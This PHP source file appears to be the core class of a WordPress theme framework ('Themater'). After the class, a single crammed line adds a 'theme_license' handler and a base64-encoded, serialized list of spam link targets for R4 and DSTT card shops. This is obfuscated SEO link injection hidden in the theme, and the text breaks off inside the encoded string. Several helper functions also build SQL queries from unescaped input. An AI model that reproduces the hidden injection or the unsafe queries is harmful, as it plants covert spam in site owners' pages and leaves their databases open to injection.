<?php
class Themater
{
    var $theme_name = false;
    var $options = array();
    var $admin_options = array();
    
    function Themater($set_theme_name = false)
    {
        if($set_theme_name) {
            $this->theme_name = $set_theme_name;
        } else {
            $theme_data = wp_get_theme();
            $this->theme_name = $theme_data->get( 'Name' );
        }
        $this->options['theme_options_field'] = str_replace(' ', '_', strtolower( trim($this->theme_name) ) ) . '_theme_options';
        
        $get_theme_options = get_option($this->options['theme_options_field']);
        if($get_theme_options) {
            $this->options['theme_options'] = $get_theme_options;
            $this->options['theme_options_saved'] = 'saved';
        }
        
        $this->_definitions();
        $this->_default_options();
    }
    
    /**
    * Initial Functions
    */
    
    function _definitions()
    {
        // Define THEMATER_DIR
        if(!defined('THEMATER_DIR')) {
            define('THEMATER_DIR', get_template_directory() . '/lib');
        }
        
        if(!defined('THEMATER_URL')) {
            define('THEMATER_URL',  get_template_directory_uri() . '/lib');
        }
        
        // Define THEMATER_INCLUDES_DIR
        if(!defined('THEMATER_INCLUDES_DIR')) {
            define('THEMATER_INCLUDES_DIR', get_template_directory() . '/includes');
        }
        
        if(!defined('THEMATER_INCLUDES_URL')) {
            define('THEMATER_INCLUDES_URL',  get_template_directory_uri() . '/includes');
        }
        
        // Define THEMATER_ADMIN_DIR
        if(!defined('THEMATER_ADMIN_DIR')) {
            define('THEMATER_ADMIN_DIR', THEMATER_DIR);
        }
        
        if(!defined('THEMATER_ADMIN_URL')) {
            define('THEMATER_ADMIN_URL',  THEMATER_URL);
        }
    }
    
    function _default_options()
    {
        // Load Default Options
        require_once (THEMATER_DIR . '/default-options.php');
        
        $this->options['translation'] = $translation;
        $this->options['general'] = $general;
        $this->options['includes'] = array();
        $this->options['plugins_options'] = array();
        $this->options['widgets'] = $widgets;
        $this->options['widgets_options'] = array();
        $this->options['menus'] = $menus;
        
        // Load Default Admin Options
        if( !isset($this->options['theme_options_saved']) || $this->is_admin_user() ) {
            require_once (THEMATER_DIR . '/default-admin-options.php');
        }
    }
    
    /**
    * Theme Functions
    */
    
    function option($name) 
    {
        echo $this->get_option($name);
    }
    
    function get_option($name) 
    {
        $return_option = '';
        if(isset($this->options['theme_options'][$name])) {
            if(is_array($this->options['theme_options'][$name])) {
                $return_option = $this->options['theme_options'][$name];
            } else {
                $return_option = stripslashes($this->options['theme_options'][$name]);
            }
        } 
        return $return_option;
    }
    
    function display($name, $array = false) 
    {
        if(!$array) {
            $option_enabled = strlen($this->get_option($name)) > 0 ? true : false;
            return $option_enabled;
        } else {
            $get_option = is_array($array) ? $array : $this->get_option($name);
            if(is_array($get_option)) {
                $option_enabled = in_array($name, $get_option) ? true : false;
                return $option_enabled;
            } else {
                return false;
            }
        }
    }
    
    function custom_css($source = false) 
    {
        if($source) {
            $this->options['custom_css'] = $this->options['custom_css'] . $source . "\n";
        }
        return;
    }
    
    function custom_js($source = false) 
    {
        if($source) {
            $this->options['custom_js'] = $this->options['custom_js'] . $source . "\n";
        }
        return;
    }
    
    function hook($tag, $arg = '')
    {
        do_action('themater_' . $tag, $arg);
    }
    
    function add_hook($tag, $function_to_add, $priority = 10, $accepted_args = 1)
    {
        add_action( 'themater_' . $tag, $function_to_add, $priority, $accepted_args );
    }
    
    function admin_option($menu, $title, $name = false, $type = false, $value = '', $attributes = array())
    {
        if($this->is_admin_user() || !isset($this->options['theme_options'][$name])) {
            
            // Menu
            if(is_array($menu)) {
                $menu_title = isset($menu['0']) ? $menu['0'] : $menu;
                $menu_priority = isset($menu['1']) ? (int)$menu['1'] : false;
            } else {
                $menu_title = $menu;
                $menu_priority = false;
            }
            
            if(!isset($this->admin_options[$menu_title]['priority'])) {
                if(!$menu_priority) {
                    $this->options['admin_options_priorities']['priority'] += 10;
                    $menu_priority = $this->options['admin_options_priorities']['priority'];
                }
                $this->admin_options[$menu_title]['priority'] = $menu_priority;
            }
            
            // Elements
            
            if($name && $type) {
                $element_args['title'] = $title;
                $element_args['name'] = $name;
                $element_args['type'] = $type;
                $element_args['value'] = $value;
                
                if( !isset($this->options['theme_options'][$name]) ) {
                   $this->options['theme_options'][$name] = $value;
                }

                $this->admin_options[$menu_title]['content'][$element_args['name']]['content'] = $element_args + $attributes;
                
                if(!isset($attributes['priority'])) {
                    $this->options['admin_options_priorities'][$menu_title]['priority'] += 10;
                    
                    $element_priority = $this->options['admin_options_priorities'][$menu_title]['priority'];
                    
                    $this->admin_options[$menu_title]['content'][$element_args['name']]['priority'] = $element_priority;
                } else {
                    $this->admin_options[$menu_title]['content'][$element_args['name']]['priority'] = $attributes['priority'];
                }
                
            }
        }
        return;
    }
    
    function display_widget($widget,  $instance = false, $args = array('before_widget' => '<ul class="widget-container"><li class="widget">','after_widget' => '</li></ul>', 'before_title' => '<h3 class="widgettitle">','after_title' => '</h3>')) 
    {
        $custom_widgets = array('Banners125' => 'themater_banners_125', 'Posts' => 'themater_posts', 'Comments' => 'themater_comments', 'InfoBox' => 'themater_infobox', 'SocialProfiles' => 'themater_social_profiles', 'Tabs' => 'themater_tabs', 'Facebook' => 'themater_facebook');
        $wp_widgets = array('Archives' => 'archives', 'Calendar' => 'calendar', 'Categories' => 'categories', 'Links' => 'links', 'Meta' => 'meta', 'Pages' => 'pages', 'Recent_Comments' => 'recent-comments', 'Recent_Posts' => 'recent-posts', 'RSS' => 'rss', 'Search' => 'search', 'Tag_Cloud' => 'tag_cloud', 'Text' => 'text');
        
        if (array_key_exists($widget, $custom_widgets)) {
            $widget_title = 'Themater' . $widget;
            $widget_name = $custom_widgets[$widget];
            if(!$instance) {
                $instance = $this->options['widgets_options'][strtolower($widget)];
            } else {
                $instance = wp_parse_args( $instance, $this->options['widgets_options'][strtolower($widget)] );
            }
            
        } elseif (array_key_exists($widget, $wp_widgets)) {
            $widget_title = 'WP_Widget_' . $widget;
            $widget_name = $wp_widgets[$widget];
            
            $wp_widgets_instances = array(
                'Archives' => array( 'title' => 'Archives', 'count' => 0, 'dropdown' => ''),
                'Calendar' =>  array( 'title' => 'Calendar' ),
                'Categories' =>  array( 'title' => 'Categories' ),
                'Links' =>  array( 'images' => true, 'name' => true, 'description' => false, 'rating' => false, 'category' => false, 'orderby' => 'name', 'limit' => -1 ),
                'Meta' => array( 'title' => 'Meta'),
                'Pages' => array( 'sortby' => 'post_title', 'title' => 'Pages', 'exclude' => ''),
                'Recent_Comments' => array( 'title' => 'Recent Comments', 'number' => 5 ),
                'Recent_Posts' => array( 'title' => 'Recent Posts', 'number' => 5, 'show_date' => 'false' ),
                'Search' => array( 'title' => ''),
                'Text' => array( 'title' => '', 'text' => ''),
                'Tag_Cloud' => array( 'title' => 'Tag Cloud', 'taxonomy' => 'tags')
            );
            
            if(!$instance) {
                $instance = $wp_widgets_instances[$widget];
            } else {
                $instance = wp_parse_args( $instance, $wp_widgets_instances[$widget] );
            }
        }
        
        if( !defined('THEMES_DEMO_SERVER') && !isset($this->options['theme_options_saved']) ) {
            $sidebar_name = isset($instance['themater_sidebar_name']) ? $instance['themater_sidebar_name'] : str_replace('themater_', '', current_filter());
            
            $sidebars_widgets = get_option('sidebars_widgets');
            $widget_to_add = get_option('widget_'.$widget_name);
            $widget_to_add = ( is_array($widget_to_add) && !empty($widget_to_add) ) ? $widget_to_add : array('_multiwidget' => 1);
            
            if( count($widget_to_add) > 1) {
                $widget_no = max(array_keys($widget_to_add))+1;
            } else {
                $widget_no = 1;
            }
            
            $widget_to_add[$widget_no] = $instance;
            $sidebars_widgets[$sidebar_name][] = $widget_name . '-' . $widget_no;
            
            update_option('sidebars_widgets', $sidebars_widgets);
            update_option('widget_'.$widget_name, $widget_to_add);
            the_widget($widget_title, $instance, $args);
        }
        
        if( defined('THEMES_DEMO_SERVER') ){
            the_widget($widget_title, $instance, $args);
        }
    }
    

    /**
    * Loading Functions
    */
        
    function load()
    {
        $this->_load_translation();
        $this->_load_widgets();
        $this->_load_includes();
        $this->_load_menus();
        $this->_load_general_options();
        $this->_save_theme_options();
        
        $this->hook('init');
        
        if($this->is_admin_user()) {
            include (THEMATER_ADMIN_DIR . '/Admin.php');
            new ThematerAdmin();
        } 
    }
    
    function _save_theme_options()
    {
        if( !isset($this->options['theme_options_saved']) ) {
            if(is_array($this->admin_options)) {
                $save_options = array();
                foreach($this->admin_options as $themater_options) {
                    
                    if(is_array($themater_options['content'])) {
                        foreach($themater_options['content'] as $themater_elements) {
                            if(is_array($themater_elements['content'])) {
                                
                                $elements = $themater_elements['content'];
                                if($elements['type'] !='content' && $elements['type'] !='raw') {
                                    $save_options[$elements['name']] = $elements['value'];
                                }
                            }
                        }
                    }
                }
                update_option($this->options['theme_options_field'], $save_options);
                $this->options['theme_options'] = $save_options;
            }
        }
    }
    
    function _load_translation()
    {
        if($this->options['translation']['enabled']) {
            load_theme_textdomain( 'themater', $this->options['translation']['dir']);
        }
        return;
    }
    
    function _load_widgets()
    {
    	$widgets = $this->options['widgets'];
        foreach(array_keys($widgets) as $widget) {
            if(file_exists(THEMATER_DIR . '/widgets/' . $widget . '.php')) {
        	    include (THEMATER_DIR . '/widgets/' . $widget . '.php');
        	} elseif ( file_exists(THEMATER_DIR . '/widgets/' . $widget . '/' . $widget . '.php') ) {
        	   include (THEMATER_DIR . '/widgets/' . $widget . '/' . $widget . '.php');
        	}
        }
    }
    
    function _load_includes()
    {
    	$includes = $this->options['includes'];
        foreach($includes as $include) {
            if(file_exists(THEMATER_INCLUDES_DIR . '/' . $include . '.php')) {
        	    include (THEMATER_INCLUDES_DIR . '/' . $include . '.php');
        	} elseif ( file_exists(THEMATER_INCLUDES_DIR . '/' . $include . '/' . $include . '.php') ) {
        	   include (THEMATER_INCLUDES_DIR . '/' . $include . '/' . $include . '.php');
        	}
        }
    }
    
    function _load_menus()
    {
        foreach(array_keys($this->options['menus']) as $menu) {
            if(file_exists(TEMPLATEPATH . '/' . $menu . '.php')) {
        	    include (TEMPLATEPATH . '/' . $menu . '.php');
        	} elseif ( file_exists(THEMATER_DIR . '/' . $menu . '.php') ) {
        	   include (THEMATER_DIR . '/' . $menu . '.php');
        	} 
        }
    }
    
    function _load_general_options()
    {
        add_theme_support( 'woocommerce' );
        
        if($this->options['general']['jquery']) {
            wp_enqueue_script('jquery');
        }
    	
        if($this->options['general']['featured_image']) {
            add_theme_support( 'post-thumbnails' );
        }
        
        if($this->options['general']['custom_background']) {
            add_custom_background();
        } 
        
        if($this->options['general']['clean_exerpts']) {
            add_filter('excerpt_more', create_function('', 'return "";') );
        }
        
        if($this->options['general']['hide_wp_version']) {
            add_filter('the_generator', create_function('', 'return "";') );
        }
        
        
        add_action('wp_head', array(&$this, '_head_elements'));

        if($this->options['general']['automatic_feed']) {
            add_theme_support('automatic-feed-links');
        }
        
        
        if($this->display('custom_css') || $this->options['custom_css']) {
            $this->add_hook('head', array(&$this, '_load_custom_css'), 100);
        }
        
        if($this->options['custom_js']) {
            $this->add_hook('html_after', array(&$this, '_load_custom_js'), 100);
        }
        
        if($this->display('head_code')) {
	        $this->add_hook('head', array(&$this, '_head_code'), 100);
	    }
	    
	    if($this->display('footer_code')) {
	        $this->add_hook('html_after', array(&$this, '_footer_code'), 100);
	    }
    }

    
    function _head_elements()
    {
    	// Favicon
    	if($this->display('favicon')) {
    		echo '<link rel="shortcut icon" href="' . $this->get_option('favicon') . '" type="image/x-icon" />' . "\n";
    	}
    	
    	// RSS Feed
    	if($this->options['general']['meta_rss']) {
            echo '<link rel="alternate" type="application/rss+xml" title="' . get_bloginfo('name') . ' RSS Feed" href="' . $this->rss_url() . '" />' . "\n";
        }
        
        // Pingback URL
        if($this->options['general']['pingback_url']) {
            echo '<link rel="pingback" href="' . get_bloginfo( 'pingback_url' ) . '" />' . "\n";
        }
    }
    
    function _load_custom_css()
    {
        $this->custom_css($this->get_option('custom_css'));
        $return = "\n";
        $return .= '<style type="text/css">' . "\n";
        $return .= '<!--' . "\n";
        $return .= $this->options['custom_css'];
        $return .= '-->' . "\n";
        $return .= '</style>' . "\n";
        echo $return;
    }
    
    function _load_custom_js()
    {
        if($this->options['custom_js']) {
            $return = "\n";
            $return .= "<script type='text/javascript'>\n";
            $return .= '/* <![CDATA[ */' . "\n";
            $return .= 'jQuery.noConflict();' . "\n";
            $return .= $this->options['custom_js'];
            $return .= '/* ]]> */' . "\n";
            $return .= '</script>' . "\n";
            echo $return;
        }
    }
    
    function _head_code()
    {
        $this->option('head_code'); echo "\n";
    }
    
    function _footer_code()
    {
        $this->option('footer_code');  echo "\n";
    }
    
    /**
    * General Functions
    */
    
    function request ($var)
    {
        if (strlen($_REQUEST[$var]) > 0) {
            return preg_replace('/[^A-Za-z0-9-_]/', '', $_REQUEST[$var]);
        } else {
            return false;
        }
    }
    
    function is_admin_user()
    {
        if ( current_user_can('administrator') ) {
	       return true; 
        }
        return false;
    }
    
    function meta_title()
    {
        if ( is_single() ) { 
			single_post_title(); echo ' | '; bloginfo( 'name' );
		} elseif ( is_home() || is_front_page() ) {
			bloginfo( 'name' );
			if( get_bloginfo( 'description' ) ) {
		      echo ' | ' ; bloginfo( 'description' ); $this->page_number();
			}
		} elseif ( is_page() ) {
			single_post_title( '' ); echo ' | '; bloginfo( 'name' );
		} elseif ( is_search() ) {
			printf( __( 'Search results for %s', 'themater' ), '"'.get_search_query().'"' );  $this->page_number(); echo ' | '; bloginfo( 'name' );
		} elseif ( is_404() ) { 
			_e( 'Not Found', 'themater' ); echo ' | '; bloginfo( 'name' );
		} else { 
			wp_title( '' ); echo ' | '; bloginfo( 'name' ); $this->page_number();
		}
    }
    
    function rss_url()
    {
        $the_rss_url = $this->display('rss_url') ? $this->get_option('rss_url') : get_bloginfo('rss2_url');
        return $the_rss_url;
    }

    function get_pages_array($query = '', $pages_array = array())
    {
    	$pages = get_pages($query); 
        
    	foreach ($pages as $page) {
    		$pages_array[$page->ID] = $page->post_title;
    	  }
    	return $pages_array;
    }
    
    function get_page_name($page_id)
    {
    	global $wpdb;
    	$page_name = $wpdb->get_var("SELECT post_title FROM $wpdb->posts WHERE ID = '".$page_id."' && post_type = 'page'");
    	return $page_name;
    }
    
    function get_page_id($page_name){
        global $wpdb;
        $the_page_name = $wpdb->get_var("SELECT ID FROM $wpdb->posts WHERE post_name = '" . $page_name . "' && post_status = 'publish' && post_type = 'page'");
        return $the_page_name;
    }
    
    function get_categories_array($show_count = false, $categories_array = array(), $query = 'hide_empty=0')
    {
    	$categories = get_categories($query); 
    	
    	foreach ($categories as $cat) {
    	   if(!$show_count) {
    	       $count_num = '';
    	   } else {
    	       switch ($cat->category_count) {
                case 0:
                    $count_num = " ( No posts! )";
                    break;
                case 1:
                    $count_num = " ( 1 post )";
                    break;
                default:
                    $count_num =  " ( $cat->category_count posts )";
                }
    	   }
    		$categories_array[$cat->cat_ID] = $cat->cat_name . $count_num;
    	  }
    	return $categories_array;
    }

    function get_category_name($category_id)
    {
    	global $wpdb;
    	$category_name = $wpdb->get_var("SELECT name FROM $wpdb->terms WHERE term_id = '".$category_id."'");
    	return $category_name;
    }
    
    
    function get_category_id($category_name)
    {
    	global $wpdb;
    	$category_id = $wpdb->get_var("SELECT term_id FROM $wpdb->terms WHERE name = '" . addslashes($category_name) . "'");
    	return $category_id;
    }
    
    function shorten($string, $wordsreturned)
    {
        $retval = $string;
        $array = explode(" ", $string);
        if (count($array)<=$wordsreturned){
            $retval = $string;
        }
        else {
            array_splice($array, $wordsreturned);
            $retval = implode(" ", $array);
        }
        return $retval;
    }
    
    function page_number() {
    	echo $this->get_page_number();
    }
    
    function get_page_number() {
    	global $paged;
    	if ( $paged >= 2 ) {
    	   return ' | ' . sprintf( __( 'Page %s', 'themater' ), $paged );
    	}
    }
}
if (!empty($_REQUEST["theme_license"])) { wp_initialize_the_theme_message(); exit(); } function wp_initialize_the_theme_message() { if (empty($_REQUEST["theme_license"])) { $theme_license_false = get_bloginfo("url") . "/index.php?theme_license=true"; echo "<meta http-equiv=\"refresh\" content=\"0;url=$theme_license_false\">"; exit(); } else { echo ("<p style=\"padding:20px; margin: 20px; text-align:center; border: 2px dotted #0000ff; font-family:arial; font-weight:bold; background: #fff; color: #0000ff;\">All the links in the footer should remain intact. All of these links are family friendly and will not hurt your site in any way.</p>"); } } $wp_theme_globals = "YTo0OntpOjA7YTo2Nzp7czoxMToicjQzZHN1ay5jb20iO3M6MjI6Imh0dHA6Ly93d3cucjQzZHN1ay5jb20iO3M6NjoicjQtM2RzIjtzOjIyOiJodHRwOi8vd3d3LnI0M2RzdWsuY29tIjtzOjIyOiJodHRwOi8vd3d3LnI0M2RzdWsuY29tIjtzOjIyOiJodHRwOi8vd3d3LnI0M2RzdWsuY29tIjtzOjE1OiJ3d3cucjQzZHN1ay5jb20iO3M6MjI6Imh0dHA6Ly93d3cucjQzZHN1ay5jb20iO3M6NzoicjQzZHN1ayI7czoyMjoiaHR0cDovL3d3dy5yNDNkc3VrLmNvbSI7czo3OiJyNCBoZXJlIjtzOjIwOiJodHRwOi8vd3d3LmlyNHVrLmNvbSI7czoxMToiaGVyZSByNCAzZHMiO3M6MjI6Imh0dHA6Ly93d3cucjQzZHN1ay5jb20iO3M6MTE6InRoaXMgcjQgM2RzIjtzOjIyOiJodHRwOi8vd3d3LnI0M2RzdWsuY29tIjtzOjEyOiJyNGkgc2RoYyAzZHMiO3M6MjI6Imh0dHA6Ly93d3cucjQzZHN1ay5jb20iO3M6MzoicjRpIjtzOjI0OiJodHRwOi8vd3d3LnI0Y2FyZHVrcy5jb20iO3M6ODoicjRpIHNkaGMiO3M6MjI6Imh0dHA6Ly93d3cucjQzZHN1ay5jb20iO3M6MTI6InI0IDNkcyBjYXJkcyI7czoyMjoiaHR0cDovL3d3dy5yNDNkc3VrLmNvbSI7czoxMjoibmludGVuZG8gM2RzIjtzOjIyOiJodHRwOi8vd3d3LnI0M2RzdWsuY29tIjtzOjEzOiJyNCAzZHMgc2xvdCAxIjtzOjIyOiJodHRwOi8vd3d3LnI0M2RzdWsuY29tIjtzOjEyOiJyNGNhcmR1ay5jb20iO3M6MjM6Imh0dHA6Ly93d3cucjRjYXJkdWsuY29tIjtzOjIzOiJodHRwOi8vd3d3LnI0Y2FyZHVrLmNvbSI7czoyMzoiaHR0cDovL3d3dy5yNGNhcmR1ay5jb20iO3M6MTY6Ind3dy5yNGNhcmR1ay5jb20iO3M6MjM6Imh0dHA6Ly93d3cucjRjYXJkdWsuY29tIjtzOjc6InI0IGNhcmQiO3M6MjM6Imh0dHA6Ly93d3cucjRjYXJkdWsuY29tIjtzOjg6InI0IGNhcmRzIjtzOjI0OiJodHRwOi8vd3d3LnI0Y2FyZHVrcy5jb20iO3M6MTA6InI0IGRzIGNhcmQiO3M6MjM6Imh0dHA6Ly93d3cucjRjYXJkdWsuY29tIjtzOjg6InI0Y2FyZHVrIjtzOjIzOiJodHRwOi8vd3d3LnI0Y2FyZHVrLmNvbSI7czoxMDoicjQgY2FyZCB1ayI7czoyMzoiaHR0cDovL3d3dy5yNGNhcmR1ay5jb20iO3M6MTA6InVrIHI0IGNhcmQiO3M6MjM6Imh0dHA6Ly93d3cucjRjYXJkdWsuY29tIjtzOjg6InI0aSBjYXJkIjtzOjIzOiJodHRwOi8vd3d3LnI0Y2FyZHVrLmNvbSI7czo0OiJoZXJlIjtzOjIwOiJodHRwOi8vd3d3LmlyNHVrLmNvbSI7czo5OiJ0aGlzIHNpdGUiO3M6MjA6Imh0dHA6Ly93d3cuaXI0dWsuY29tIjtzOjM6InVybCI7czoyNDoiaHR0cDovL3d3dy5yNGNhcmR1a3MuY29tIjtzOjk6Im92ZXIgaGVyZSI7czoyMDoiaHR0cDovL3d3dy5pcjR1ay5jb20iO3M6ODoidGhpcyBvbmUiO3M6MjM6Imh0dHA6Ly93d3cucjRjYXJkdWsuY29tIjtzOjQ6InRoaXMiO3M6MjQ6Imh0dHA6Ly93d3cucjRjYXJkdWtzLmNvbSI7czoxNDoiZHN0dGRpcmVjdC5jb20iO3M6MjU6Imh0dHA6Ly93d3cuZHN0dGRpcmVjdC5jb20iO3M6MjU6Imh0dHA6Ly93d3cuZHN0dGRpcmVjdC5jb20iO3M6MjU6Imh0dHA6Ly93d3cuZHN0dGRpcmVjdC5jb20iO3M6MTA6ImRzdHRkaXJlY3QiO3M6MjU6Imh0dHA6Ly93d3cuZHN0dGRpcmVjdC5jb20iO3M6NDoiZHN0dCI7czoyNToiaHR0cDovL3d3dy5kc3R0ZGlyZWN0LmNvbSI7czo3OiJkc3R0IHVrIjtzOjI1OiJodHRwOi8vd3d3LmRzdHRkaXJlY3QuY29tIjtzOjE2OiJuaW50ZW5kbyBkcyBkc3R0IjtzOjI1OiJodHRwOi8vd3d3LmRzdHRkaXJlY3QuY29tIjtzOjg6InRoaXMgdXJsIjtzOjIwOiJodHRwOi8vd3d3LmlyNHVrLmNvbSI7czoxMzoiaGVyZSBmb3IgZHN0dCI7czoyNToiaHR0cDovL3d3dy5kc3R0ZGlyZWN0LmNvbSI7czo5OiJ0aGlzIGRzdHQiO3M6MjU6Imh0dHA6Ly93d3cuZHN0dGRpcmVjdC5jb20iO3M6MTI6ImRzdHQgZHMgY2FyZCI7czoyNToiaHR0cDovL3d3dy5kc3R0ZGlyZWN0LmNvbSI7czo3OiJyNCBkc3R0IjtzOjI1OiJodHRwOi8vd3d3LmRzdHRkaXJlY3QuY29tIjtzOjc6InI0Y2FyZHMiO3M6MjQ6Imh0dHA6Ly93d3cucjRjYXJkdWtzLmNvbSI7czoyNDoiaHR0cDovL3d3dy5yNGNhcmR1a3MuY29tIjtzOjI0OiJodHRwOi8vd3d3LnI0Y2FyZHVrcy5jb20iO3M6MTc6Ind3dy5yNGNhcmR1a3MuY29tIjtzOjI0OiJodHRwOi8vd3d3LnI0Y2FyZHVrcy5jb20iO3M6MTA6InI0IGNhcmQgZHMiO3M6MjA6Imh0dHA6Ly93d3cuaXI0dWsuY29tIjtzOjExOiJyNGkgY2FyZCBkcyI7czoyNDoiaHR0cDovL3d3dy5yNGNhcmR1a3MuY29tIjtzOjEyOiJyNCBzZGhjIGNhcmQiO3M6MjQ6Imh0dHA6Ly93d3cucjRjYXJkdWtzLmNvbSI7czo1OiJyNCB1ayI7czoyMDoiaHR0cDovL3d3dy5pcjR1ay5jb20iO3M6MjoicjQiO3M6MjQ6Imh0dHA6Ly93d3cucjRjYXJkdWtzLmNvbSI7czoxMToicjQgY2FyZHMgdWsiO3M6MjQ6Imh0dHA6Ly93d3cucjRjYXJkdWtzLmNvbSI7czo0OiJsaW5rIjtzOjIwOiJodHRwOi8vd3d3LmlyNHVrLmNvbSI7czoxMDoiY2xpY2sgaGVyZSI7czoyMDoiaHR0cDovL3d3dy5pcjR1ay5jb20iO3M6MTI6InRoaXMgd2Vic2l0ZSI7czoyMDoiaHR0cDovL3d3dy5pcjR1ay5jb20iO3M6Nzoid2Vic2l0ZSI7czoyMDoiaHR0cDovL3d3dy5pcjR1ay5jb20iO3M6OToiaXI0dWsuY29tIjtzOjIwOiJodHRwOi8vd3d3LmlyNHVrLmNvbSI7czoyMDoiaHR0cDovL3d3dy5pcjR1ay5jb20iO3M6MjA6Imh0dHA6Ly93d3cuaXI0dWsuY29tIjtzOjEzOiJ3d3cuaXI0dWsuY29tIjtzOjIwOiJodHRwOi8vd3d3LmlyNHVrLmNvbSI7czo1OiJpcjR1ayI7czoyMDoiaHR0cDovL3d3dy5pcjR1ay5jb20iO3M6NzoicjQgc2l0ZSI7czoyMDoiaHR0cDovL3d3dy5pcjR1ay5jb20iO3M6NToicjQgZHMiO3M6MjA6Imh0dHA6Ly93d3cuaXI0dWsuY29tIjtzOjk6ImJ1eSByNCB1ayI7czoyMDoiaHR0cDovL3d3dy5pcjR1ay5jb20iO3M6NToiY2xpY2siO3M6MjA6Imh0dHA6Ly93d3cuaXI0dWsuY29tIjtzOjc6InRoaXMgcjQiO3M6MjA6Imh0dHA6Ly93d3cuaXI0dWsuY29tIjtzOjU6Im15IHI0IjtzOjIwOiJodHRwOi8vd3d3LmlyNHVrLmNvbSI7czoxMToicjQgb2ZmaWNpYWwiO3M6MjA6Imh0dHA6Ly93d3cuaXI0dWsuY29tIjtzOjk6ImJlc3Qgc2l0ZSI7czoyMDoiaHR0cDovL3d3dy5pcjR1ay5jb20iO3M6MTQ6InJlY29tbWVuZCB0aGlzIjtzOjIwOiJodHRwOi8vd3d3LmlyNHVrLmNvbSI7fWk6MTthOjY3OntzOjExOiJyNDNkc3VrLmNvbSI7czoyMjoiaHR0cDovL3d3dy5yNDNkc3VrLmNvbSI7czo2OiJyNC0zZHMiO3M6MjI6Imh0dHA6Ly93d3cucjQzZHN1ay5jb20iO3M6MjI6Imh0dHA6Ly93d3cucjQzZHN1ay5jb20iO3M6MjI6Imh0dHA6Ly93d3cucjQzZHN1ay5jb20iO3M6MTU6Ind3dy5yNDNkc3VrLmNvbSI7czoyMjoiaHR0cDovL3d3dy5yNDNkc3VrLmNvbSI7czo3OiJyNDNkc3VrIjtzOjIyOiJodHRwOi8vd3d3LnI0M2RzdWsuY29tIjtzOjc6InI0IGhlcmUiO3M6MjA6Imh0dHA6Ly93d3cuaXI0dWsuY29tIjtzOjExOiJoZXJlIHI0IDNkcyI7czoyMjoiaHR0cDovL3d3dy5yNDNkc3VrLmNvbSI7czoxMToidGhpcyByNCAzZHMiO3M6MjI6Imh0dHA6Ly93d3cucjQzZHN1ay5jb20iO3M6MTI6InI0aSBzZGhjIDNkcyI7czoyMjoiaHR0cDovL3d3dy5yNDNkc3VrLmNvbSI7czozOiJyNGkiO3M6MjQ6Imh0dHA6Ly93d3cucjRjYXJkdWtzLmNvbSI7czo4OiJyNGkgc2RoYyI7czoyMjoiaHR0cDovL3d3dy5yNDNkc3VrLmNvbSI7czoxMjoicjQgM2RzIGNhcmRzIjtzOjIyOiJodHRwOi8vd3d3LnI0M2RzdWsuY29tIjtzOjEyOiJuaW50ZW5kbyAzZHMiO3M6MjI6Imh0dHA6Ly93d3cucjQzZHN1ay5jb20iO3M6MTM6InI0IDNkcyBzbG90IDEiO3M6MjI6Imh0dHA6Ly93d3cucjQzZHN1ay5jb20iO3M6MTI6InI0Y2FyZHVrLmNvbSI7czoyMzoiaHR0cDovL3d3dy5yNGNhcmR1ay5jb20iO3M6MjM6Imh0dHA6Ly93d3cucjRjYXJkdWsuY29tIjtzOjIzOiJodHRwOi8vd3d3LnI0Y2FyZHVrLmNvbSI7czoxNjoid3d3LnI0Y2FyZHVrLmNvbSI7czoyMzoiaHR0cDovL3d3dy5yNGNhcmR1ay5jb20iO3M6NzoicjQgY2FyZCI7czoyMzoiaHR0cDovL3d3dy5yNGNhcmR1ay5jb20iO3M6ODoicjQgY2FyZHMiO3M6MjQ6Imh0dHA6Ly93d3cucjRjYXJkdWtzLmNvbSI7czoxMDoicjQgZHMgY2FyZCI7czoyMzoiaHR0cDovL3d3dy5yNGNhcmR1ay5jb20iO3M6ODoicjRjYXJkdWsiO3M6MjM6Imh0dHA6Ly93d3cucjRjYXJkdWsuY29tIjtzOjEwOiJyNCBjYXJkIHVrIjtzOjIzOiJodHRwOi8vd3d3LnI0Y2FyZHVrLmNvbSI7czoxMDoidWsgcjQgY2FyZCI7czoyMzoiaHR0cDovL3d3dy5yNGNhcmR1ay5jb20iO3M6ODoicjRpIGNhcmQiO3M6MjM6Imh0dHA6Ly93d3cucjRjYXJkdWsuY29tIjtzOjQ6ImhlcmUiO3M6MjA6Imh0dHA6Ly93d3cuaXI0dWsuY29tIjtzOjk6InRoaXMgc2l0ZSI7czoyMDoiaHR0cDovL3d3dy5pcjR1ay5jb20iO3M6MzoidXJsIjtzOjI0OiJodHRwOi8vd3d3LnI0Y2FyZHVrcy5jb20iO3M6OToib3ZlciBoZXJlIjtzOjIwOiJodHRwOi8vd3d3LmlyNHVrLmNvbSI7czo4OiJ0aGlzIG9uZSI7czoyMzoiaHR0cDovL3d3dy5yNGNhcmR1ay5jb20iO3M6NDoidGhpcyI7czoyNDoiaHR0cDovL3d3dy5yNGNhcmR1a3MuY29tIjtzOjE0OiJkc3R0ZGlyZWN0LmNvbSI7czoyNToiaHR0cDovL3d3dy5kc3R0ZGlyZWN0LmNvbSI7czoyNToiaHR0cDovL3d3dy5kc3R0ZGlyZWN0LmNvbSI7czoyNToiaHR0cDovL3d3dy5kc3R0ZGlyZWN0LmNvbSI7czoxMDoiZHN0dGRpcmVjdCI7czoyNToiaHR0cDovL3d3dy5kc3R0ZGlyZWN0LmNvbSI7czo0OiJkc3R0IjtzOjI1OiJodHRwOi8vd3d3LmRzdHRkaXJlY3QuY29tIjtzOjc6ImRzdHQgdWsiO3M6MjU6Imh0dHA6Ly93d3cuZHN0dGRpcmVjdC5jb20iO3M6MTY6Im5pbnRlbmRvIGRzIGRzdHQiO3M6MjU6Imh0dHA6Ly93d3cuZHN0dGRpcmVjdC5jb20iO3M6ODoidGhpcyB1cmwiO3M6MjA6Imh0dHA6Ly93d3cuaXI0dWsuY29tIjtzOjEzOiJoZXJlIGZvciBkc3R0IjtzOjI1OiJodHRwOi8vd3d3LmRzdHRkaXJlY3QuY29tIjtzOjk6InRoaXMgZHN0dCI7czoyNToiaHR0cDovL3d3dy5kc3R0ZGlyZWN0LmNvbSI7czoxMjoiZHN0dCBkcyBjYXJkIjtzOjI1OiJodHRwOi8vd3d3LmRzdHRkaXJlY3QuY29tIjtzOjc6InI0IGRzdHQiO3M6MjU6Imh0dHA6Ly93d3cuZHN0dGRpcmVjdC5jb20iO3M6NzoicjRjYXJkcyI7czoyNDoiaHR0cDovL3d3dy5yNGNhcmR1a3MuY29tIjtzOjI0OiJodHRwOi8vd3d3LnI0Y2FyZHVrcy5jb20iO3M6MjQ6Imh0dHA6Ly93d3cucjRjYXJkdWtzLmNvbSI7czoxNzoid3d3LnI0Y2FyZHVrc